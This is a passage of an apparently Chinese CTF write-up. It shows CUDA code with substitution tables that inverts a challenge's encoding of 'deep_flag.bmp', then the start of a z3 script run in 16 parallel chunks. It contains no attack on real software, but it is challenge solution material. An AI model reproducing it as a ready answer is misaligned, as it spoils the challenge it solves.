class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sbox[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>, <span class="number">0x2B</span>, <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x99</span>, <span class="number">0x9C</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0xE4</span>, <span class="number">0xB3</span>,</span><br><span class="line">    <span class="number">0x1C</span>, <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>,</span><br><span class="line">    <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>, <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>, <span class="number">0xF3</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x17</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>,</span><br><span class="line">    <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>, <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>,</span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xD1</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>,</span><br><span class="line">    <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xEA</span>, <span class="number">0xBF</span>,</span><br><span class="line">    <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>, <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>,</span><br><span class="line">    <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>,</span><br><span class="line">    <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>,</span><br><span class="line">    <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>,</span><br><span class="line">    <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x0A</span>, <span class="number">0xC1</span>,</span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>,</span><br><span class="line">    <span class="number">0xB8</span>, <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>,</span><br><span class="line">    <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>,</span><br><span class="line">    <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>, <span class="number">0x48</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tbox[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0x7C</span>, <span class="number">0x76</span>, <span class="number">0x7A</span>, <span class="number">0xF2</span>, <span class="number">0x6A</span>, <span class="number">0x6E</span>, <span class="number">0xC4</span>, <span class="number">0x30</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x2A</span>, <span class="number">0xFE</span>, <span class="number">0xD6</span>, <span class="number">0xAA</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC8</span>, <span class="number">0x7C</span>,</span><br><span class="line">    <span class="number">0xFA</span>, <span class="number">0x58</span>, <span class="number">0x46</span>, <span class="number">0xF0</span>, <span class="number">0xAC</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAE</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>,</span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB6</span>, <span class="number">0xFC</span>, <span class="number">0x92</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3E</span>, <span class="number">0xF6</span>, <span class="number">0xCC</span>,</span><br><span class="line">    <span class="number">0x34</span>, <span class="number">0xA4</span>, <span class="number">0xE4</span>, <span class="number">0xF0</span>, <span class="number">0x70</span>, <span class="number">0xD8</span>, <span class="number">0x30</span>, <span class="number">0x14</span>, <span class="number">0x04</span>, <span class="number">0xC6</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xC2</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x04</span>, <span class="number">0x9A</span>, <span class="number">0x06</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>,</span><br><span class="line">    <span class="number">0xEA</span>, <span class="number">0x26</span>, <span class="number">0xB2</span>, <span class="number">0x74</span>, <span class="number">0x08</span>, <span class="number">0x82</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1A</span>, <span class="number">0x6E</span>,</span><br><span class="line">    <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3A</span>, <span class="number">0xD6</span>, <span class="number">0xB2</span>, <span class="number">0x28</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0xD0</span>, <span class="number">0x00</span>, <span class="number">0xEC</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB0</span>, <span class="number">0x5A</span>, <span class="number">0x6A</span>, <span class="number">0xCA</span>,</span><br><span class="line">    <span class="number">0xBE</span>, <span class="number">0x38</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCE</span>, <span class="number">0xD0</span>, <span class="number">0xEE</span>, <span class="number">0xAA</span>, <span class="number">0xFA</span>,</span><br><span class="line">    <span class="number">0x42</span>, <span class="number">0x4C</span>, <span class="number">0x32</span>, <span class="number">0x84</span>, <span class="number">0x44</span>, <span class="number">0xF8</span>, <span class="number">0x02</span>, <span class="number">0x7E</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0xA8</span>, <span class="number">0x50</span>, <span class="number">0xA2</span>, <span class="number">0x40</span>, <span class="number">0x8E</span>, <span class="number">0x92</span>, <span class="number">0x9C</span>, <span class="number">0x38</span>, <span class="number">0xF4</span>,</span><br><span class="line">    <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x20</span>, <span class="number">0x10</span>, <span class="number">0xFE</span>, <span class="number">0xF2</span>, <span class="number">0xD2</span>, <span class="number">0xCC</span>, <span class="number">0x0C</span>,</span><br><span class="line">    <span class="number">0x12</span>, <span class="number">0xEC</span>, <span class="number">0x5E</span>, <span class="number">0x96</span>, <span class="number">0x44</span>, <span class="number">0x16</span>, <span class="number">0xC4</span>, <span class="number">0xA6</span>, <span class="number">0x7E</span>, <span class="number">0x3C</span>,</span><br><span class="line">    <span class="number">0x64</span>, <span class="number">0x5C</span>, <span class="number">0x18</span>, <span class="number">0x72</span>, <span class="number">0x60</span>, <span class="number">0x80</span>, <span class="number">0x4E</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEF</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0A</span>, <span class="number">0xDA</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x48</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD2</span>,</span><br><span class="line">    <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x90</span>, <span class="number">0x94</span>, <span class="number">0xE4</span>, <span class="number">0x78</span>, <span class="number">0xE6</span>, <span class="number">0xC8</span>, <span class="number">0x36</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0xD4</span>, <span class="number">0x4E</span>, <span class="number">0xA8</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x64</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x24</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>,</span><br><span class="line">    <span class="number">0xE8</span>, <span class="number">0xDC</span>, <span class="number">0x74</span>, <span class="number">0x1E</span>, <span class="number">0x4A</span>, <span class="number">0xBC</span>, <span class="number">0x8A</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>,</span><br><span class="line">    <span class="number">0xB4</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x02</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x60</span>, <span class="number">0x34</span>, <span class="number">0x56</span>, <span class="number">0xB8</span>,</span><br><span class="line">    <span class="number">0x86</span>, <span class="number">0xC0</span>, <span class="number">0x1C</span>, <span class="number">0x9E</span>, <span class="number">0xE0</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x10</span>, <span class="number">0x68</span>, <span class="number">0xD8</span>,</span><br><span class="line">    <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9A</span>, <span class="number">0x1E</span>, <span class="number">0x86</span>, <span class="number">0xE8</span>, <span class="number">0xCE</span>, <span class="number">0x54</span>, <span class="number">0x28</span>, <span class="number">0xDE</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0xA0</span>, <span class="number">0x88</span>, <span class="number">0x0C</span>, <span class="number">0xBE</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x40</span>, <span class="number">0x98</span>,</span><br><span class="line">    <span class="number">0x2C</span>, <span class="number">0x0E</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBA</span>, <span class="number">0x16</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        invSbox[sbox[i]] = i;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* Input = <span class="keyword">new</span> <span class="type">uint8_t</span>[<span class="number">256</span> * <span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">readFile</span>(<span class="string">&quot;deep_flag.bmp&quot;</span>, Input, <span class="number">14</span> + <span class="number">40</span> + <span class="number">1024</span>, <span class="number">0x10000</span>);</span><br><span class="line">    <span class="built_in">cudaMemcpyToSymbol</span>(cuda_sbox, sbox, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMemcpyToSymbol</span>(cuda_tbox, tbox, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMemcpyToSymbol</span>(cuda_invsbox, invSbox, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="type">uint8_t</span>* InPtr&#123;&#125;, * OutPtr&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;InPtr, <span class="number">0x10000</span>);</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;OutPtr, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(InPtr, Input, <span class="number">0x10000</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line">    <span class="function">dim3 <span class="title">Blocks</span><span class="params">(<span class="number">256</span>, <span class="number">1</span>, <span class="number">1</span>)</span>, <span class="title">Threads</span><span class="params">(<span class="number">256</span>, <span class="number">1</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">    Re_Layer3_part1 &lt;&lt; &lt;Blocks, Threads &gt;&gt; &gt; (InPtr, OutPtr);</span><br><span class="line">    <span class="built_in">cudaDeviceSynchronize</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(Input, OutPtr, <span class="number">0x10000</span>, cudaMemcpyDeviceToHost);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">writeToFile</span>(<span class="string">&quot;Steg2&quot;</span>, Input, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaFree</span>(InPtr);</span><br><span class="line">    <span class="built_in">cudaFree</span>(OutPtr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>[] Input;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>z3求解部分代码：</p><p>直接<code>python a.py num</code>这样运行，最后num是下标，这边一共将0x10000数据分为16块，也就是16个进程同时跑，所以运行脚本num得从0-15都一起运行，最后生成16份分块的解密数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sbox = [</span><br><span class="line">    <span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>, <span class="number">0x2B</span>, <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x99</span>, <span class="number">0x9C</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0xE4</span>, <span class="number">0xB3</span>,</span><br><span class="line">    <span class="number">0x1C</span>, <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>,</span><br><span class="line">    <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>, <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>, <span class="number">0xF3</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x17</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>,</span><br><span class="line">    <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>, <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>,</span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xD1</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>,</span><br><span class="line">    <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xEA</span>, <span class="number">0xBF</span>,</span><br><span class="line">    <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>, <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>,</span><br><span class="line">    <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>,</span><br><span class="line">    <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>,</span><br><span class="line">    <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>,</span><br><span class="line">    <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x0A</span>, <span class="number">0xC1</span>,</span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>,</span><br><span class="line">    <span class="number">0xB8</span>, <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>,</span><br><span class="line">    <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>,</span><br><span class="line">    <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>, <span class="number">0x48</span> </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">tbox = [</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0x7C</span>, <span class="number">0x76</span>, <span class="number">0x7A</span>, <span class="number">0xF2</span>, <span class="number">0x6A</span>, <span class="number">0x6E</span>, <span class="number">0xC4</span>, <span class="number">0x30</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x2A</span>, <span class="number">0xFE</span>, <span class="number">0xD6</span>, <span class="number">0xAA</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC8</span>, <span class="number">0x7C</span>,</span><br><span class="line">    <span class="number">0xFA</span>, <span class="number">0x58</span>, <span class="number">0x46</span>, <span class="number">0xF0</span>, <span class="number">0xAC</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAE</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>,</span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB6</span>, <span class="number">0xFC</span>, <span class="number">0x92</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3E</span>, <span class="number">0xF6</span>, <span class="number">0xCC</span>,</span><br><span class="line">    <span class="number">0x34</span>, <span 